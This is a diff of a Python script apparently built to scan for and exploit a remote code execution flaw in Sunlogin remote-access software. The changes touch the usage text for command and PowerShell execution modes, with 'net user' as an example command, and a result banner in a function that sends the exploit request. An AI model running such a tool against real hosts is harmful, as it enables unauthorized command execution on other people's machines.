@@ -154,11 +154,11 @@ def title():
                     EG:'targetsfile = 'targets.txt'  
                         'resultfile = 'result.txt'  \n'
     ===================================================================
-    RCE CMD:
-    usage = "Usage: python exp.py -a [--host] -p [port] -c [--command]\n"
+    RCE CMD usage =
+    "Usage: python sunlogin-rce-scan.py -a [--host] -p [port] -c [--command]\n"
     eg:'python exp.py -a 127.0.0.1 -p 59527 -c "net user"\n'
-    RCE PowerShell:
-    usage = "Usage: python exp.py -a [--host] -p [port] -s [--pws]\n"
+    RCE PowerShell usage =
+    "Usage: python sunlogin-rce-scan.py -a [--host] -p [port] -s [--pws]\n"
     eg:'python exp.py -a 127.0.0.1 -p 59527 -s "net user"\n'
     ===================================================================
     """)
@@ -183,7 +183,7 @@ def RunPowerShell(ip, port, pws,token):
     try:
         resu = requests.get(poc1, cookies=cookies, timeout=50,verify=False).text
         print('POC:',poc1)
-        print('>>>>>>>>>>>>>>success>>>>>>>>>>>>>>>>>')
+        print('>>>>>>>>>>>>>>result>>>>>>>>>>>>>>>>>')
         print(resu)
     except Exception as _:
         return ("fail", "Error_")
